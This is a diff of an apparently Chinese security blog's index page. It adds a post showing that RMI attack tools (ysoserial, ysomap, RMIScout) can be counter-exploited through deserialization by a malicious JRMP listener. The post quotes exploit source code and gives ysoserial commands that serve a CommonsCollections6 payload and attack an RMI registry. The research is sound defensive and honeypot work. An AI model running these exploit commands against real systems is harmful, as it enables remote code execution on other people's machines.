@@ -146,6 +146,220 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Java序列化与反序列化流程分析" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/12/06/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">Java序列化与反序列化流程分析</a>
+    </h1>
+  
+
+        
+        <a href="/2021/12/06/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/" class="archive-article-date">
+  	<time datetime="2021-12-06T03:39:40.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-12-06</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>分析下原生的Java序列化与反序列化流程，为了尽量覆盖各种情况，需要找一个比较复杂的对象进行调试，这里选择CC1链。没有覆盖到的情况结合文档分析。
+        
+          <a class="article-more-a" href="/2021/12/06/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/12/06/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-shiro反序列化漏洞与tomcat类加载机制" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/30/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8Etomcat%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/">shiro反序列化漏洞与tomcat类加载机制</a>
+    </h1>
+  
+
+        
+        <a href="/2021/11/30/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8Etomcat%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/" class="archive-article-date">
+  	<time datetime="2021-11-30T15:29:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-30</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>shiro反序列化漏洞中有个经典的现象，就是不能用ysoserial自带的链去打commons-collections3的依赖。有很多文章分析过，但总觉得没完全看懂，差了点什么。那么调试源码详细分析下这个问题。
+        
+          <a class="article-more-a" href="/2021/11/30/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8Etomcat%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/11/30/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B8%8Etomcat%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-猎人还是猎物-RMI之反制篇" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/11/22/%E7%8C%8E%E4%BA%BA%E8%BF%98%E6%98%AF%E7%8C%8E%E7%89%A9-RMI%E4%B9%8B%E5%8F%8D%E5%88%B6%E7%AF%87/">猎人还是猎物-RMI之反制篇</a>
+    </h1>
+  
+
+        
+        <a href="/2021/11/22/%E7%8C%8E%E4%BA%BA%E8%BF%98%E6%98%AF%E7%8C%8E%E7%89%A9-RMI%E4%B9%8B%E5%8F%8D%E5%88%B6%E7%AF%87/" class="archive-article-date">
+  	<time datetime="2021-11-22T15:23:39.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-11-22</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>闲来无事，反制ysoserial (<br>之前分析RMI的时候，发现对于客户端的反序列化攻击都是没有被修复的，也就是说如果调用了原生jdk的rmi客户端相关调用，连接恶意JRMP服务端就会触发反序列化。<br>攻击客户端的场景不多，除了反打服务器，打真正客户端的场景可能就是反制了，或者叫蜜罐也行。那么看下常见的攻击RMI的安全工具有没有这种问题。</p>
+<h3 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h3><p>上来先看看Java安全神器ysoserial里和RMI有关的exp。yso里面大部分都是本地生成payload，但也有一些打远程服务的，比如RMIRegistryExploit</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">final</span> String host = args[<span class="number">0</span>];</span><br><span class="line">	<span class="keyword">final</span> <span class="keyword">int</span> port = Integer.parseInt(args[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">final</span> String command = args[<span class="number">3</span>];</span><br><span class="line">	Registry registry = LocateRegistry.getRegistry(host, port);</span><br><span class="line">	<span class="keyword">final</span> String className = CommonsCollections1.class.getPackage().getName() +  <span class="string">&quot;.&quot;</span> + args[<span class="number">2</span>];</span><br><span class="line">	<span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass = (Class&lt;? extends ObjectPayload&gt;) Class.forName(className);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// test RMI registry connection and upgrade to SSL connection on fail</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		registry.list();</span><br><span class="line">	&#125; <span class="keyword">catch</span>(ConnectIOException ex) &#123;</span><br><span class="line">		registry = LocateRegistry.getRegistry(host, port, <span class="keyword">new</span> RMISSLClientSocketFactory());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ensure payload doesn&#x27;t detonate during construction or deserialization</span></span><br><span class="line">	exploit(registry, payloadClass, command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exploit</span><span class="params">(<span class="keyword">final</span> Registry registry,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">final</span> Class&lt;? extends ObjectPayload&gt; payloadClass,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">	<span class="keyword">new</span> ExecCheckingSecurityManager().callWrapped(<span class="keyword">new</span> Callable&lt;Void&gt;()&#123;<span class="function"><span class="keyword">public</span> Void <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">		ObjectPayload payloadObj = payloadClass.newInstance();</span><br><span class="line">           Object payload = payloadObj.getObject(command);</span><br><span class="line">		String name = <span class="string">&quot;pwned&quot;</span> + System.nanoTime();</span><br><span class="line">		Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			registry.bind(name, remote);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		Utils.releasePayload(payloadObj, payload);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">	&#125;&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看到了registry.list和registry.bind，这两处就是调用的原生的RegistryImpl_Stub，会触发UnicastRef#invoke-&gt;StreamRemoteCall#executeCall导致反序列化，这里就有反序列化点了。 (实际上只有list那里可以触发，下面的bind是在yso的沙箱保护下的。在18年的一次更新才引入了这处list，也就是说老的版本是不会被攻击的。 )<br>调用链自然也没啥问题，毕竟ysoserial算是天底下反序列化链最多的地方了。感觉就像个弹药库把自己给炸了。<br>所以攻击很简单，就用JRMPListener在1099端口(RMI注册中心默认端口)起一个恶意服务端，原汤化原食了属于是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 calc.exe</span><br></pre></td></tr></table></figure>
+<p>然后客户端扮演jb小子，nmap扫完看见1099开了直接打：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit ip 1099 CommonsCollections6 whoami</span><br></pre></td></tr></table></figure>
+<p>喜提计算器。<br>很奇怪的是在另一个攻击rmi的脚本ysoserial/exploit/JRMPClient.java里</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Generic JRMP client</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Pretty much the same thing as &#123;<span class="doctag">@link</span> RMIRegistryExploit&#125; but </span></span><br><span class="line"><span class="comment"> * - targeting the remote DGC (Distributed Garbage Collection, always there if there is a listener)</span></span><br><span class="line"><span class="comment"> * - not deserializing anything (so you don&#x27;t get yourself exploited ;))</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> mbechler</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>
+<p>注释里特意写了not deserializing anything，说明开发者是想到过反打的问题的，但不知道为什么没有注意到另一处。<br>顺带一提，恶意服务器如果在实现时触发了反序列化一样是会被攻击的，只不过这种场景少了点。</p>
+<h3 id="ysomap"><a href="#ysomap" class="headerlink" title="ysomap"></a>ysomap</h3><p>ysomap是wh1t3p1g大师傅开发的Java反序列化辅助工具，和ysoserial相比可以更细化的修改payload，但是用着比较麻烦，研究了半天也没咋用明白。<br>同样这个工具也提供了攻击RMI registry的功能，看一下这部分实现，在ysomap/exploits/rmi/component/Naming.java  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">lookup</span><span class="params">(Registry registry, Object obj)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        RemoteRef ref = (RemoteRef) ReflectionHelper.getFieldValue(registry, <span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        <span class="keyword">long</span> interfaceHash = (<span class="keyword">long</span>) ReflectionHelper.getFieldValue(registry, <span class="string">&quot;interfaceHash&quot;</span>);</span><br><span class="line">        java.rmi.server.Operation[] operations = (Operation[]) ReflectionHelper.getFieldValue(registry, <span class="string">&quot;operations&quot;</span>);</span><br><span class="line">        java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, <span class="number">2</span>, interfaceHash);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line">                <span class="comment">//反射修改enableReplace</span></span><br><span class="line">                ReflectionHelper.setFieldValue(out, <span class="string">&quot;enableReplace&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">                out.writeObject(obj); <span class="comment">// arm obj</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> java.rmi.MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            ref.invoke(call);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException | RemoteException | NotBoundException e) &#123;</span><br></pre></td></tr></table></figure>
+<p>重写了lookup，调用了JDK原生的ref.invoke，那么一样是有反打的问题的。<br>没太用明白，大概是这么用吧：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit RMIRegistryExploit</span><br><span class="line">use payload RMIConnectWrappedWithProxy</span><br><span class="line">use bullet RMIConnectBullet</span><br><span class="line"><span class="built_in">set</span> target ip:1099</span><br><span class="line"><span class="built_in">set</span> rhost ip2</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>服务端一样是JRMPListener，一样打cc就行。计算器x2。</p>
+<h3 id="RMIScout"><a href="#RMIScout" class="headerlink" title="RMIScout"></a>RMIScout</h3><p>RMIScout也是一个攻击RMI的工具，看了下这个工具重点支持攻击服务端的方式，也就是通过爆破远程方法签名攻击服务端，portswigger也宣传过这个工具<a target="_blank" rel="noopener" href="https://portswigger.net/daily-swig/rmiscout-new-hacking-tool-brute-forces-java-rmi-servers-for-vulnerabilities">https://portswigger.net/daily-swig/rmiscout-new-hacking-tool-brute-forces-java-rmi-servers-for-vulnerabilities</a><br>在rmiscout/RMIConnector.java一样是看到了原生的registry.list  </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">RMIConnector</span><span class="params">(String host, <span class="keyword">int</span> port, String remoteName, List&lt;String&gt; signatures, <span class="keyword">boolean</span> allowUnsafe, <span class="keyword">boolean</span> isActivationServer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.host = host;</span><br><span class="line">            <span class="keyword">this</span>.allowUnsafe = allowUnsafe;</span><br><span class="line">            <span class="keyword">this</span>.signatures = signatures;</span><br><span class="line">            <span class="keyword">this</span>.isActivationServer = isActivationServer;</span><br><span class="line">            String[] regNames = <span class="keyword">null</span>;</span><br><span class="line">            isSSL = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// Attempt a standard cleartext connection</span></span><br><span class="line">                <span class="keyword">this</span>.registry = LocateRegistry.getRegistry(host, port);</span><br><span class="line">                regNames = registry.list();</span><br></pre></td></tr></table></figure>
+<p>这个工具的攻击实际是依赖ysoserial实现的，那么一样会被反打</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar rmiscout-1.4-SNAPSHOT-all.jar list ip 1099</span><br></pre></td></tr></table></figure>
+<p>计算器x3</p>
+<h3 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h3><p>常见的攻击RMI的还有个经典工具BaRMIe，实际上它的攻击流程也会触发反序列化，但是这个工具并不是用加载依赖的方式来生成payload的，而是直接写死的。那么没有依赖库，反序列化也很难打本地的链了。<br>另外metasploit也有对应的exp，完全基于ruby实现的，自然不会有Java反序列化的问题，还是msf懂安全。</p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a><br><a target="_blank" rel="noopener" href="https://github.com/wh1t3p1g/ysomap">https://github.com/wh1t3p1g/ysomap</a><br><a target="_blank" rel="noopener" href="https://github.com/BishopFox/rmiscout">https://github.com/BishopFox/rmiscout</a><br><a target="_blank" rel="noopener" href="https://github.com/NickstaDB/BaRMIe">https://github.com/NickstaDB/BaRMIe</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/11/22/%E7%8C%8E%E4%BA%BA%E8%BF%98%E6%98%AF%E7%8C%8E%E7%89%A9-RMI%E4%B9%8B%E5%8F%8D%E5%88%B6%E7%AF%87/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-JNDI注入与动态类加载" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -594,234 +808,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/07/21/%E5%BD%BB%E5%BA%95%E7%90%86%E8%A7%A3windows%E8%AE%A4%E8%AF%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-逻辑漏洞部分实例总结" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%83%A8%E5%88%86%E5%AE%9E%E4%BE%8B%E6%80%BB%E7%BB%93/">逻辑漏洞部分实例总结</a>
-    </h1>
-  
-
-        
-        <a href="/2020/07/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%83%A8%E5%88%86%E5%AE%9E%E4%BE%8B%E6%80%BB%E7%BB%93/" class="archive-article-date">
-  	<time datetime="2020-07-15T08:44:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>平时接触的一大半都是逻辑漏洞，很多时候其实也不算漏洞，只是功能设计有缺陷，更多的是需要改变思路，想出利用场景，改个数据包轻松高危。
-        
-          <a class="article-more-a" href="/2020/07/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%83%A8%E5%88%86%E5%AE%9E%E4%BE%8B%E6%80%BB%E7%BB%93/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">挖洞</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/07/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%83%A8%E5%88%86%E5%AE%9E%E4%BE%8B%E6%80%BB%E7%BB%93/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-安卓安全新手村攻略" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/07/02/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8%E6%96%B0%E6%89%8B%E6%9D%91%E6%94%BB%E7%95%A5/">安卓安全新手村攻略</a>
-    </h1>
-  
-
-        
-        <a href="/2020/07/02/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8%E6%96%B0%E6%89%8B%E6%9D%91%E6%94%BB%E7%95%A5/" class="archive-article-date">
-  	<time datetime="2020-07-02T13:26:45.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-02</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>最近要测一些app，除了直接测web端也有覆盖移动端常见的漏洞，学学常见的安卓漏洞和drozer的用法。
-        
-          <a class="article-more-a" href="/2020/07/02/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8%E6%96%B0%E6%89%8B%E6%9D%91%E6%94%BB%E7%95%A5/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">挖洞</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/07/02/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8%E6%96%B0%E6%89%8B%E6%9D%91%E6%94%BB%E7%95%A5/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-挖洞教科书The-Bug-Hunter-s-Methodology-v4-0记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/06/25/%E6%8C%96%E6%B4%9E%E6%95%99%E7%A7%91%E4%B9%A6The-Bug-Hunter-s-Methodology-v4-0%E8%AE%B0%E5%BD%95/">挖洞教科书The-Bug-Hunter&#39;s-Methodology-v4.0记录</a>
-    </h1>
-  
-
-        
-        <a href="/2020/06/25/%E6%8C%96%E6%B4%9E%E6%95%99%E7%A7%91%E4%B9%A6The-Bug-Hunter-s-Methodology-v4-0%E8%AE%B0%E5%BD%95/" class="archive-article-date">
-  	<time datetime="2020-06-25T09:58:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>jason haddix的经典教程又更新了，翻译记录下。正好最近要刷刷src。
-        
-          <a class="article-more-a" href="/2020/06/25/%E6%8C%96%E6%B4%9E%E6%95%99%E7%A7%91%E4%B9%A6The-Bug-Hunter-s-Methodology-v4-0%E8%AE%B0%E5%BD%95/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">挖洞</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/06/25/%E6%8C%96%E6%B4%9E%E6%95%99%E7%A7%91%E4%B9%A6The-Bug-Hunter-s-Methodology-v4-0%E8%AE%B0%E5%BD%95/">展开全文 >></a>
         </p>
       
 
